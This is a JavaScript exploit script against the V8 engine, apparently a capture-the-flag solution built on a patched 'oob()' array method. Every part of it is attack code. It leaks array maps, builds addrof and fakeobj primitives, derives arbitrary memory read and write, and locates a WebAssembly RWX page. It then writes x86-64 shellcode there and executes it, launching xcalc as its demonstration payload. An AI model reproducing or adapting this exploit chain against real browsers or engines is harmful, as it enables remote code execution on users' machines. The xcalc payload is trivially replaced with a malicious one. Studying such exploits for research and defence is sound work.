let fi_buf = new ArrayBuffer(8); // shared buffer for float and bigint
let f_buf = new Float64Array(fi_buf); // buffer for float
let i_buf = new BigUint64Array(fi_buf); // buffer for bigint

// convert float to bigint
function ftoi(f) {
    f_buf[0] = f;
    return i_buf[0];
}

// convert bigint to float
function itof(i) {
    i_buf[0] = i;
    return f_buf[0];
}

// convert (big)int to hex string
function hex(i) {
    return `0x${i.toString(16)}`;
}

let float_arr;
let tmp_obj = {};
let obj_arr;

(function layout() {
    float_arr = [1.1];
    obj_arr = [tmp_obj];
})();

let float_arr_map = ftoi(float_arr.oob());
let obj_arr_map = ftoi(obj_arr.oob());
console.log(`[+] float_arr_map == ${hex(float_arr_map)}`);
console.log(`[+] obj_arr_map == ${hex(obj_arr_map)}`);

// get address of |obj|
function addrof(obj) {
    obj_arr[0] = obj;
    obj_arr.oob(itof(float_arr_map)); // overwrite map of |obj_arr| with map of |float_arr|
    let addr = ftoi(obj_arr[0]);
    obj_arr.oob(itof(obj_arr_map)); // restore map of |obj_arr|
    return addr;
}

// generate fake object at |addr|
function fakeobj(addr) {
    obj_arr.oob(itof(float_arr_map)); // overwrite map of |obj_arr| with map of |float_arr|
    obj_arr[0] = itof(addr);
    obj_arr.oob(itof(obj_arr_map)); // restore map of |obj_arr|
    return obj_arr[0];
}


let fake_arr_struct = [itof(float_arr_map), 2.2, 3.3, itof(1n << 32n)];

// read 8 bytes from |addr|
function aar(addr) {
    fake_arr_struct[2] = itof(addr - 0x10n);
    let fake_arr = fakeobj(addrof(fake_arr_struct) - 0x20n);
    return ftoi(fake_arr[0]);
}

// write 8 bytes |value| to |addr|
function aaw(addr, value) {
    fake_arr_struct[2] = itof(addr - 0x10n);
    let fake_arr = fakeobj(addrof(fake_arr_struct) - 0x20n);
    fake_arr[0] = itof(value);
}

// allocate rwx region
let wasm_code = new Uint8Array([0x0, 0x61, 0x73, 0x6d, 0x1, 0x0, 0x0, 0x0, 0x1, 0x4, 0x1, 0x60, 0x0, 0x0, 0x3, 0x2, 0x1, 0x0, 0x7, 0x8, 0x1, 0x4, 0x6d, 0x61, 0x69, 0x6e, 0x0, 0x0, 0xa, 0x4, 0x1, 0x2, 0x0, 0xb]);
let wasm_module = new WebAssembly.Module(wasm_code);
let wasm_instance = new WebAssembly.Instance(wasm_module);

// get address of rwx region
let wasm_instance_addr = addrof(wasm_instance);
console.log(`[+] wasm_instance_addr == ${hex(wasm_instance_addr)}`);
let rwx = aar(wasm_instance_addr + 0x88n);
console.log(`[+] rwx == ${hex(rwx)}`);

// execve("/bin/xcalc", 0, ["DISPLAY=:0", 0])
const shellcode = [0x48, 0xc7, 0xc0, 0x6c, 0x63, 0x0, 0x0, 0x50, 0x48, 0xb8, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x78, 0x63, 0x61, 0x50, 0x48, 0x89, 0xe7, 0x48, 0x31, 0xf6, 0x48, 0xc7, 0xc0, 0x3a, 0x30, 0x0, 0x0, 0x50, 0x48, 0xb8, 0x44, 0x49, 0x53, 0x50, 0x4c, 0x41, 0x59, 0x3d, 0x50, 0x48, 0x89, 0xe0, 0x48, 0xc7, 0xc3, 0x0, 0x0, 0x0, 0x0, 0x53, 0x50, 0x48, 0x89, 0xe2, 0x48, 0xc7, 0xc0, 0x3b, 0x0, 0x0, 0x0, 0xf, 0x5];

let buf = new ArrayBuffer(shellcode.length);
let view = new DataView(buf);
aaw(addrof(buf) + 0x20n, rwx); // overwrite backing store of |buf| with address of rwx region

// write shellcode to rwx region
console.log("[+] Writing shellcode...");
for (let i = 0; i < shellcode.length; i++) {
    view.setUint8(i, shellcode[i]);
}

// execute shellcode
console.log("[+] Executing shellcode...");
wasm_instance.exports.main();
